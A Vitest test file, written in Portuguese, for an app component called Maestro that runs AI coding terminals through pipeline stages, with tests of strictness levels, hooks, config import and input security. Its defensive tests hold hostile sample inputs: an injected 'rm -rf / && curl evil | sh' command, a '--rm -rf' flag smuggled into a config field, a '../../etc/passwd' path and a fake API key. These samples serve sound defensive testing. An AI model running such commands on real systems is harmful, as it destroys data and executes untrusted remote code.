import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { criarTmp, limpar, novoBanco } from "../../tests/fixtures/dominio/ambiente";
import { confirmar, esperar, HARNESS_OK, montar, oc, pedirBug, TEXTO_BUG } from "../../tests/fixtures/maestro/ligacao";
import { CONFIG_MAESTRO_PADRAO } from "../nucleo/maestro";
import { obterServicoMaestro, definirLigacaoMaestro } from "./maestro";
import { PRODUTO } from "../nucleo/produto";

afterEach(() => {
  limpar();
  definirLigacaoMaestro(null);
  vi.useRealTimers();
});


describe("leveza: nada no boot, serviço sob demanda", () => {
  it("ligar e iniciar sem pipeline ativo não cria o serviço, não arma o temporizador e não toca o método", async () => {
    const m = montar();
    await m.l.iniciar();
    expect(m.criarServico).not.toHaveBeenCalled();
    expect(m.l.temPipelineAtivo()).toBe(false);
    expect(m.abertos).toEqual([]);
    m.l.encerrar();
  });
  it("o primeiro `pedir` cria o serviço (uma vez) e NÃO abre terminal (plano proposto + 1 recibo no SQLite)", async () => {
    const m = montar();
    const r = await pedirBug(m);
    expect(m.criarServico).toHaveBeenCalledTimes(1);
    expect(r.plano).toMatchObject({ intencao: "bug", pipeline_id: "runx", nivel: 3 });
    expect(m.abertos).toEqual([]);
    expect((await m.l.listarPipelines({ workspace_id: m.ws, so_ativos: true, limite: 10 })).map((p) => p.estado)).toEqual(["proposto"]);
    expect(await m.l.listarRecibos({ workspace_id: m.ws, limite: 10 })).toHaveLength(1);
    await pedirBug(m, "corrige o erro 500 no cadastro de clientes");
    expect(m.criarServico).toHaveBeenCalledTimes(1);
    m.l.encerrar();
  });
});

describe("confirmar → um terminal por etapa → o disco avança → próxima etapa (event `metodo:mudou`)", () => {
  it("abre o 1º terminal com `/expx:runx-causa`, marcado como Pane de etapa; método mudou ⇒ despacha E2 em OUTRO terminal", async () => {
    const m = montar();
    await m.l.iniciar();
    const { plano } = await pedirBug(m);
    const r = await confirmar(m, plano.id);
    expect(r.estado).toBe("executando");
    expect(m.abertos).toHaveLength(1);
    expect(m.abertos[0]).toMatchObject({ cli: "claude", papel: "explorador", workspace_id: m.ws });
    expect(m.abertos[0]?.prompt_inicial).toBe(`/expx:runx-causa ${TEXTO_BUG}`);
    expect(m.abertos[0]?.contexto).toMatchObject({ maestro_etapa: true, pipeline_id: plano.id, etapa_id: "runx.e1" });
    expect(m.l.temPipelineAtivo()).toBe(true);
    // o método (skill) avança sozinho no disco: OC criada, estágio e2
    m.definirDisco(oc("e2"));
    m.barramento.emitir("metodo:mudou", { workspace_id: m.ws });
    await esperar(60);
    expect(m.abertos).toHaveLength(2);
    expect(m.abertos[1]?.prompt_inicial).toMatch(/^\/expx:runx-plano /);
    m.l.encerrar();
  });
  it("`pane.state_changed` de um Pane do pipeline reavalia; de um Pane alheio não faz nada", async () => {
    const m = montar();
    await m.l.iniciar();
    const { plano } = await pedirBug(m);
    await confirmar(m, plano.id);
    const det = await m.l.detalhe(plano.id);
    const paneId = det?.execs.find((e) => e.pane_id !== null)?.pane_id as string;
    const servico = await m.l.servico();
    const avancar = vi.spyOn(servico, "avancarPipeline");
    m.barramento.emitir("pane.state_changed", { pane_id: "pane_alheio", estado: "pronto" });
    await esperar(30);
    expect(avancar).not.toHaveBeenCalled();
    m.barramento.emitir("pane.state_changed", { pane_id: paneId, estado: "pronto" });
    await esperar(30);
    expect(avancar).toHaveBeenCalledTimes(1);
    m.l.encerrar();
  });
  it("debounce: rajada de eventos vira UMA avaliação", async () => {
    const m = montar();
    await m.l.iniciar();
    const { plano } = await pedirBug(m);
    await confirmar(m, plano.id);
    const avancar = vi.spyOn(await m.l.servico(), "avancarPipeline");
    for (let i = 0; i < 20; i++) m.barramento.emitir("metodo:mudou", { workspace_id: m.ws });
    await esperar(40);
    expect(avancar).toHaveBeenCalledTimes(1);
    m.l.encerrar();
  });
  it("temporizador de 30 s (aqui 20 ms) só roda com pipeline ativo e para sozinho quando ele termina", async () => {
    const m = montar(undefined, { tickMs: 20 });
    await m.l.iniciar();
    const { plano } = await pedirBug(m);
    await confirmar(m, plano.id);
    const tick = vi.spyOn(await m.l.servico(), "tick");
    await esperar(70);
    expect(tick.mock.calls.length).toBeGreaterThanOrEqual(2);
    await m.l.cancelar(plano.id);
    expect(m.l.temPipelineAtivo()).toBe(false);
    await esperar(50);
    const depois = tick.mock.calls.length;
    await esperar(70);
    expect(tick.mock.calls.length).toBe(depois);
    m.l.encerrar();
  });
  it("eventos para o renderer saem coalescidos (≤ 1 a cada 250 ms por pipeline) e sem texto do pedido", async () => {
    const m = montar();
    await m.l.iniciar();
    const { plano } = await pedirBug(m);
    await confirmar(m, plano.id);
    await esperar(300);
    expect(m.eventos.length).toBeGreaterThan(0);
    expect(m.eventos.length).toBeLessThanOrEqual(3);
    expect(JSON.stringify(m.eventos)).not.toContain("botão");
    expect(m.eventos.every((e) => e.pipeline_id === plano.id && e.workspace_id === m.ws)).toBe(true);
    m.l.encerrar();
  });
});

describe("troca de conta no meio da etapa (`account.switched`, Fase 9)", () => {
  it("a etapa passa a apontar para o Pane filho (respawn), sem despachar de novo; o decisor não participa", async () => {
    const bd = novoBanco();
    const m = montar(bd, { paneDeRespawn: (antigo) => bd.banco.consultarUm<{ id: string }>("SELECT id FROM pane WHERE respawn_de = ? ORDER BY criado_em DESC LIMIT 1", [antigo])?.id ?? null });
    await m.l.iniciar();
    const { plano } = await pedirBug(m);
    await confirmar(m, plano.id);
    const antigo = (await m.l.detalhe(plano.id))?.execs.find((e) => e.pane_id !== null)?.pane_id as string;
    const filho = bd.repos.pane.criar({ workspace_id: m.ws, tipo: "cli", cli: "claude", papel: "explorador", cwd: ".", respawn_de: antigo } as never);
    bd.repos.pane.atualizar(filho.id, { estado: "trabalhando" });
    m.barramento.emitir("account.switched", { troca_id: "t1", pane_id: antigo, workspace_id: m.ws });
    await esperar(60);
    const exec = (await m.l.detalhe(plano.id))?.execs.find((e) => e.etapa_id === "runx.e1");
    expect(exec).toMatchObject({ pane_id: filho.id, estado: "executando", reutilizou_pane: false });
    expect(m.abertos).toHaveLength(1); // nada foi despachado de novo
    expect((await m.l.servico()).ehPaneDoMaestro(filho.id)).toBe(true);
    // evento de outro Pane (que não é do Maestro) não mexe em nada
    m.barramento.emitir("account.switched", { troca_id: "t2", pane_id: "pane_alheio", workspace_id: m.ws });
    await esperar(30);
    expect((await m.l.detalhe(plano.id))?.execs.find((e) => e.etapa_id === "runx.e1")?.pane_id).toBe(filho.id);
    m.l.encerrar();
  });
});

describe("reinício do app: retoma do banco + disco sem duplicar despacho", () => {
  it("nova ligação sobre o mesmo banco: `iniciar` cria o serviço SÓ porque há pipeline ativo e não reabre o terminal", async () => {
    const banco = novoBanco();
    const a = montar(banco);
    const { plano } = await pedirBug(a);
    await confirmar(a, plano.id);
    expect(a.abertos).toHaveLength(1);
    a.l.encerrar();
    const b = montar(banco, {}, { id: a.ws });
    expect(b.criarServico).not.toHaveBeenCalled();
    await b.l.iniciar();
    expect(b.criarServico).toHaveBeenCalledTimes(1);
    expect(b.l.temPipelineAtivo()).toBe(true);
    expect(b.abertos).toHaveLength(0); // a etapa já tinha Pane vivo no banco: não despacha em dobro
    // pedido.md relido do disco (o texto não está no banco): a etapa seguinte usa o pedido de verdade
    b.l.encerrar();
  });
});

describe("rigidez: persistência, travas, hooks (única escrita fora de .expxv/) e auditoria", () => {
  it("definir no workspace persiste, registra auditoria, emite `rigidez:evento` e NÃO cria `.expx/` quando o método não está instalado", async () => {
    const m = montar();
    const r = await m.l.definirRigidez({ workspace_id: m.ws, escopo: "workspace", mission_id: null, plano_id: null, nivel: 2, justificativa: null, confirmacao_digitada: null, aplicar_hooks_ja: false, voltar_ao_padrao: false });
    expect(r.efetivo).toBe(2);
    expect(r.hooks.escrito).toBe(false);
    expect(existsSync(join(m.raiz, ".expx"))).toBe(false);
    expect((await m.l.lerRigidez({ workspace_id: m.ws, mission_id: null, plano_id: null })).efetivo).toBe(2);
    expect(m.rigidez).toEqual([{ workspace_id: m.ws, mission_id: null, nivel: 2, escopo: "workspace" }]);
    expect(m.deps.repos.maestro.listarRigidezLog(m.ws, 5)).toMatchObject([{ de: 3, para: 2, por: "usuario", hooks_escritos: false }]);
  });
  it("com `.expx/` presente grava o hooks.json com backup, só por ação do usuário; nível 3 devolve ao nascimento; reverter solta só o que o ADE escreveu", async () => {
    const m = montar();
    mkdirSync(join(m.raiz, ".expx"));
    writeFileSync(join(m.raiz, ".expx", "hooks.json"), JSON.stringify({ hooks: { "zona-de-risco": "bloqueio" } }, null, 2));
    const def = (nivel: 1 | 2 | 3 | 4 | 5) => m.l.definirRigidez({ workspace_id: m.ws, escopo: "workspace", mission_id: null, plano_id: null, nivel, justificativa: null, confirmacao_digitada: null, aplicar_hooks_ja: false, voltar_ao_padrao: false });
    const r = await def(4);
    expect(r.hooks.escrito).toBe(true);
    const arquivo = JSON.parse(readFileSync(join(m.raiz, ".expx", "hooks.json"), "utf8")) as { hooks: Record<string, string> };
    expect(arquivo.hooks["zona-de-risco"]).toBe("bloqueio"); // chave de segurança do usuário preservada
    expect(arquivo.hooks["tdd-teste-antes"]).toBe("bloqueio");
    expect(existsSync(join(m.raiz, PRODUTO.pastaNoProjeto, "maestro", "backup"))).toBe(true);
    const estado = await m.l.hooksEstado({ workspace_id: m.ws, mission_id: null });
    expect(estado).toMatchObject({ presente: true, invalido: false, metodo_instalado: true, nivel_aplicado: 4 });
    expect(estado.gerenciadas.length).toBeGreaterThan(0);
    const rev = await m.l.hooksReverter({ workspace_id: m.ws, mission_id: null });
    expect(rev.revertidas.length).toBeGreaterThan(0);
    const depois = JSON.parse(readFileSync(join(m.raiz, ".expx", "hooks.json"), "utf8")) as { hooks?: Record<string, string> };
    expect(depois.hooks?.["tdd-teste-antes"]).toBeUndefined();
    expect(depois.hooks?.["zona-de-risco"]).toBe("bloqueio");
  });
  it("escrever_hooks=0 desliga a exceção: o nível muda e o arquivo nem é tocado", async () => {
    const m = montar();
    mkdirSync(join(m.raiz, ".expx"));
    m.l.gravarConfig({ workspace_id: m.ws, config: { ...cfgDto(), escrever_hooks: false }, confirmado: false });
    const r = await m.l.definirRigidez({ workspace_id: m.ws, escopo: "workspace", mission_id: null, plano_id: null, nivel: 5, justificativa: null, confirmacao_digitada: null, aplicar_hooks_ja: false, voltar_ao_padrao: false });
    expect(r.hooks.escrito).toBe(false);
    expect(existsSync(join(m.raiz, ".expx", "hooks.json"))).toBe(false);
  });
  it("produção/branch protegida + baixar exige a frase digitada (`confirmacao_necessaria`); com ela passa e fica auditado", async () => {
    const m = montar();
    m.l.gravarConfig({ workspace_id: m.ws, config: { ...cfgDto(), producao: true }, confirmado: false });
    const pedido = (confirmacao_digitada: string | null) => ({ workspace_id: m.ws, escopo: "workspace" as const, mission_id: null, plano_id: null, nivel: 1 as const, justificativa: null, confirmacao_digitada, aplicar_hooks_ja: false, voltar_ao_padrao: false });
    await expect(m.l.definirRigidez(pedido(null))).rejects.toMatchObject({ codigo: "confirmacao_necessaria" });
    await expect(m.l.definirRigidez(pedido(null))).rejects.toThrow(/^confirmacao_necessaria: /);
    await expect(m.l.definirRigidez(pedido("baixar"))).resolves.toMatchObject({ efetivo: 1 });
    expect(m.deps.repos.maestro.listarRigidezLog(m.ws, 5)[0]).toMatchObject({ trava: "producao", para: 1 });
  });
  it("mudar o nível de um pipeline em andamento vale para as pendentes e é auditado com a etapa atual", async () => {
    const m = montar();
    const { plano } = await pedirBug(m);
    await confirmar(m, plano.id);
    const r = await m.l.definirRigidez({ workspace_id: m.ws, escopo: "pedido", mission_id: null, plano_id: plano.id, nivel: 2, justificativa: null, confirmacao_digitada: null, aplicar_hooks_ja: false, voltar_ao_padrao: false });
    expect(r.efetivo).toBe(2);
    const log = m.deps.repos.maestro.listarRigidezLog(m.ws, 5);
    expect(log[0]).toMatchObject({ escopo: "pedido", de: 3, para: 2, etapa_atual: "runx.e1", pipeline_id: plano.id });
    expect((await m.l.detalhe(plano.id))?.nivel_atual).toBe(2);
  });
  it("escopo `pedido` sem plano e plano ainda proposto são recusados com erro nominal", async () => {
    const m = montar();
    const { plano } = await pedirBug(m);
    const base = { workspace_id: m.ws, escopo: "pedido" as const, mission_id: null, nivel: 2 as const, justificativa: null, confirmacao_digitada: null, aplicar_hooks_ja: false, voltar_ao_padrao: false };
    await expect(m.l.definirRigidez({ ...base, plano_id: null })).rejects.toMatchObject({ codigo: "invalid_argument" });
    await expect(m.l.definirRigidez({ ...base, plano_id: plano.id })).rejects.toMatchObject({ codigo: "estado_invalido" });
  });
  it("matriz estática cobre as 38 etapas × 5 níveis; prévia do plano é pura e não despacha nada", async () => {
    const m = montar();
    const mt = m.l.matriz();
    expect(mt.celulas.length).toBeGreaterThan(30);
    expect(mt.celulas.every((c) => Object.keys(c.por_nivel).length === 5)).toBe(true);
    expect(Object.keys(mt.hooks_por_nivel)).toEqual(["1", "2", "3", "4", "5"]);
    const etapas = await m.l.previaPlano({ workspace_id: m.ws, pipeline_id: "runx", nivel: 3 });
    expect(etapas.map((e) => e.etapa_id)).toContain("runx.e4");
    expect(etapas.some((e) => e.etapa_id === ("mergex.revisar" as never))).toBe(false);
    expect(m.abertos).toEqual([]);
  });
});

const cfgDto = () => ({ ...CONFIG_MAESTRO_PADRAO, branches_protegidas: [...CONFIG_MAESTRO_PADRAO.branches_protegidas] }) as never as import("../compartilhado/maestro").ConfigMaestroDto;

describe("configuração do Maestro por workspace", () => {
  it("desligar `confirmar_plano` exige confirmação própria; com ela vale e o padrão continua seguro", async () => {
    const m = montar();
    expect(m.l.lerConfig(m.ws).confirmar_plano).toBe(true);
    expect(() => m.l.gravarConfig({ workspace_id: m.ws, config: { ...cfgDto(), confirmar_plano: false }, confirmado: false })).toThrow(/confirmacao_necessaria/);
    expect(m.l.lerConfig(m.ws).confirmar_plano).toBe(true);
    m.l.gravarConfig({ workspace_id: m.ws, config: { ...cfgDto(), confirmar_plano: false }, confirmado: true });
    expect(m.l.lerConfig(m.ws).confirmar_plano).toBe(false);
  });
  it("valor inválido volta ao padrão e nada de segredo vai para a config", () => {
    const m = montar();
    m.l.gravarConfig({ workspace_id: m.ws, config: { ...cfgDto(), max_terminais: 99 }, confirmado: true });
    expect(m.l.lerConfig(m.ws).max_terminais).toBe(8);
    expect(Object.keys(m.l.lerConfig(m.ws)).join(",")).not.toMatch(/chave|token|key|senha/i);
  });
});

describe("configuração por etapa (matriz skill × etapa × perfil)", () => {
  it("lista as etapas configuráveis (sem as humanas) com origem; gravar vira override do workspace; restaurar volta à fábrica", async () => {
    const m = montar();
    const lista = m.l.listarConfigEtapas(m.ws);
    expect(lista.some((e) => e.config.etapa_id === ("prodx.assinatura" as never))).toBe(false);
    expect(lista.every((e) => e.origem === "fabrica")).toBe(true);
    const base = lista.find((e) => e.config.etapa_id === "runx.e3")?.config as NonNullable<(typeof lista)[number]>["config"];
    const r = await m.l.gravarConfigEtapa({ workspace_id: m.ws, config: { ...base, perfil: { ...base.perfil, modelo: "sonnet", esforco: "alto" } } });
    expect(r.config).toMatchObject({ origem: "workspace", config: { atualizado_por: "usuario", perfil: { modelo: "sonnet" } } });
    expect(m.l.listarConfigEtapas(null).find((e) => e.config.etapa_id === "runx.e3")?.origem).toBe("fabrica"); // o global não mudou
    expect(m.l.restaurarConfig({ workspace_id: m.ws, etapa_id: "runx.e3" }).find((e) => e.config.etapa_id === "runx.e3")?.origem).toBe("fabrica");
  });
  it("avaliador no MESMO perfil do implementador é recusado ao salvar (V1) e o despacho usa o override salvo", async () => {
    const m = montar();
    const lista = m.l.listarConfigEtapas(m.ws);
    const e3 = lista.find((e) => e.config.etapa_id === "runx.e3")?.config as never as import("../compartilhado/maestro").EtapaConfig;
    const e4 = lista.find((e) => e.config.etapa_id === "runx.e4")?.config as never as import("../compartilhado/maestro").EtapaConfig;
    await m.l.gravarConfigEtapa({ workspace_id: m.ws, config: { ...e3, perfil: { ...e3.perfil, cli: "claude", modelo: "opus" } } });
    await expect(m.l.gravarConfigEtapa({ workspace_id: m.ws, config: { ...e4, perfil: { ...e4.perfil, cli: "claude", modelo: "opus" } } })).rejects.toThrow(/perfil_invalido/);
    expect(m.l.listarConfigEtapas(m.ws).find((e) => e.config.etapa_id === "runx.e4")?.origem).toBe("fabrica");
  });
  it("perfis prontos (Econômico/Equilibrado/Máxima qualidade): aplica em lote e valida", async () => {
    const m = montar();
    expect(m.l.perfisProntos().map((p) => p.nome)).toEqual(["Econômico", "Equilibrado", "Máxima qualidade"]);
    const antes = m.l.listarConfigEtapas(m.ws);
    const depois = await m.l.aplicarPronto({ workspace_id: m.ws, pronto_id: "economico", cli: "manter" });
    expect(depois).toHaveLength(antes.length);
    expect(depois.some((e) => e.origem === "workspace")).toBe(true);
    await expect(m.l.aplicarPronto({ workspace_id: m.ws, pronto_id: "inexistente", cli: "manter" })).rejects.toThrow(/invalid_argument/);
  });
  it("exportar para o repositório escreve só dentro da pasta do produto; importar com prévia: hostil recusado, válido só vale ao confirmar", async () => {
    const m = montar();
    const exp = await m.l.exportar({ workspace_id: m.ws, destino: "repo" });
    expect(exp.caminho_relativo).toBe(`${PRODUTO.pastaNoProjeto}/pipelines/pipelines.json`);
    expect(existsSync(join(m.raiz, exp.caminho_relativo as string))).toBe(true);
    expect(readFileSync(join(m.raiz, exp.caminho_relativo as string), "utf8")).not.toContain(m.raiz); // sem caminho absoluto
    const previa = await m.l.importarPrevia({ workspace_id: m.ws, origem: "repo" });
    expect(previa.erros).toEqual([]);
    expect(previa.previa_id).toMatch(/^previa_/);
    // confirmar com workspace diferente da prévia é recusado
    expect(() => m.l.importarConfirmar({ previa_id: previa.previa_id as string, workspace_id: null })).toThrow(/plano_inexistente/);
    expect(m.l.importarConfirmar({ previa_id: previa.previa_id as string, workspace_id: m.ws })).toHaveLength(m.l.listarConfigEtapas(m.ws).length);
    // arquivo hostil (campo extra + modelo com flag) ⇒ recusado sem aplicar nada
    writeFileSync(join(m.raiz, PRODUTO.pastaNoProjeto, "pipelines", "pipelines.json"), JSON.stringify({ [`${PRODUTO.id}_pipelines`]: 1, etapas: [{ etapa_id: "runx.e3", perfil: { cli: "claude", modelo: "--rm -rf", esforco: null, faixa: "alto", origem_modelo: "cli", agente_id: null }, skills: ["runx-fix"], modo_execucao: "novo_terminal", atualizado_por: "usuario", extra: 1 }] }));
    const ruim = await m.l.importarPrevia({ workspace_id: m.ws, origem: "repo" });
    expect(ruim.previa_id).toBeNull();
    expect(ruim.erros.length).toBeGreaterThan(0);
  });
});

describe("segurança do pedido pelo IPC e decisor desligado", () => {
  it("contexto com Pane/Missão de outro workspace é recusado; seleção do terminal sai redigida; arquivos com `..` caem", async () => {
    const banco = novoBanco();
    const m = montar(banco);
    const outro = banco.repos.workspace.criar({ nome: "o", raiz: criarTmp("outro-") });
    const paneAlheio = banco.repos.pane.criar({ workspace_id: outro.id, tipo: "cli", cli: "claude", cwd: "." } as never);
    await expect(m.l.pedir({ workspace_id: m.ws, texto: TEXTO_BUG, contexto: { pane_id: paneAlheio.id, mission_id: null, trabalho_id: null, arquivos: [], trecho: null }, via: "paleta", nivel_pedido: null, executar_direto: null })).rejects.toThrow(/invalid_argument/);
    const segredo = ["sk", "-or-v1-", "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"].join("");
    const r = await m.l.pedir({ workspace_id: m.ws, texto: TEXTO_BUG, contexto: { pane_id: null, mission_id: null, trabalho_id: null, arquivos: ["src/a.ts", "../../etc/passwd", "/abs/x"], trecho: `erro com ${segredo}` }, via: "paleta", nivel_pedido: null, executar_direto: null });
    expect(JSON.stringify(r)).not.toContain(segredo);
  });
  it("texto do usuário só chega ao Pane como argumento normalizado (uma linha, sem controle) e nunca ao banco por inteiro", async () => {
    const m = montar();
    const { plano } = await pedirBug(m, "corrige o erro do login\n; rm -rf / && curl evil | sh\u0007");
    await confirmar(m, plano.id);
    const prompt = m.abertos[0]?.prompt_inicial as string;
    expect(prompt).not.toMatch(/[\n\r\u0007]/);
    expect(prompt.startsWith("/expx:runx-causa ")).toBe(true);
  });
  it("decisor desligado: ZERO consultas externas (a fábrica do cliente nem é chamada)", async () => {
    const ask = HARNESS_OK.decisorDeIntencao;
    ask.mockClear();
    const m = montar();
    await pedirBug(m, "melhora um pouco o carregamento da tela");
    expect(ask).not.toHaveBeenCalled();
  });
  it("erro interno não vaza caminho de máquina nem mensagem do sistema", async () => {
    const m = montar();
    await expect(m.l.pedir({ workspace_id: m.ws, texto: "   ", contexto: null, via: "paleta", nivel_pedido: null, executar_direto: null })).rejects.toThrow(/^invalid_argument: /);
    await expect(m.l.confirmar({ plano_id: "mpl_inexistente", nivel: null, etapas_desligadas: [], intencao: null, justificativa: null, confirmacao_digitada: null })).rejects.toThrow(/^plano_inexistente: /);
  });
});

describe("orquestração (tool MCP + hook) e `obterServicoMaestro`", () => {
  it("`paraOrquestracao` nunca é null e só cria o serviço no primeiro uso; Pane de etapa é reconhecido", async () => {
    const m = montar();
    const o = m.l.paraOrquestracao();
    expect(o.hookAtivo(m.ws)).toBe(true);
    expect(m.criarServico).not.toHaveBeenCalled();
    const { plano } = await pedirBug(m);
    await confirmar(m, plano.id);
    const pane = (await m.l.detalhe(plano.id))?.execs.find((e) => e.pane_id !== null)?.pane_id as string;
    expect(o.ehPaneDoMaestro(pane)).toBe(true);
    expect(o.ehPaneDoMaestro("pane_qualquer")).toBe(false);
  });
  it("com o hook desligado na config, `hookAtivo` é falso; sem ligação, `obterServicoMaestro` falha com erro claro", async () => {
    const m = montar();
    m.l.gravarConfig({ workspace_id: m.ws, config: { ...cfgDto(), hook_modo: "desligado" }, confirmado: true });
    expect(m.l.paraOrquestracao().hookAtivo(m.ws)).toBe(false);
    await expect(obterServicoMaestro()).rejects.toThrow(/ainda não iniciou/);
    definirLigacaoMaestro(m.l);
    await expect(obterServicoMaestro()).resolves.toBeDefined();
  });
});

describe("pipeline cria a Missão do trabalho (T-16.21; Fase 16 × 2)", () => {
  it("confirmar cria Missão livre, sem worktree, com origem pela intenção; os terminais de etapa abrem DENTRO dela", async () => {
    const bd = novoBanco();
    const pedidos: Array<{ p: Record<string, unknown>; extra: Record<string, unknown> | undefined }> = [];
    const missoes = {
      async criar(p: never, extra?: never) {
        pedidos.push({ p: p as Record<string, unknown>, extra: extra as Record<string, unknown> | undefined });
        return bd.repos.mission.criar({ workspace_id: (p as { workspace_id: string }).workspace_id, modo: "livre", origem: "ocorrencia", titulo: "m" });
      },
    };
    const m = montar(bd, { missoes } as never);
    await m.l.iniciar();
    const { plano } = await pedirBug(m);
    const r = await confirmar(m, plano.id);
    expect(pedidos).toHaveLength(1);
    expect(pedidos[0]?.p).toMatchObject({ workspace_id: m.ws, modo: "livre", origem: "ocorrencia", clis: {} });
    expect(String(pedidos[0]?.p["titulo"]).length).toBeLessThanOrEqual(120);
    expect(pedidos[0]?.extra).toEqual({ sem_worktree: true });
    expect(r.mission_id).not.toBeNull();
    expect(m.abertos[0]?.workspace_id).toBeUndefined(); // aberto pela Missão (`missao_id`), não solto no workspace
    m.l.encerrar();
  });
  it("falha ao criar a Missão não derruba o pipeline (segue sem Missão); sem a porta, nada muda", async () => {
    const bd = novoBanco();
    const m = montar(bd, { missoes: { criar: async () => { throw new Error("boom"); } } } as never);
    await m.l.iniciar();
    const { plano } = await pedirBug(m);
    const r = await confirmar(m, plano.id);
    expect(r.estado).toBe("executando");
    expect(r.mission_id).toBeNull();
    expect(m.abertos).toHaveLength(1);
    m.l.encerrar();
  });
});
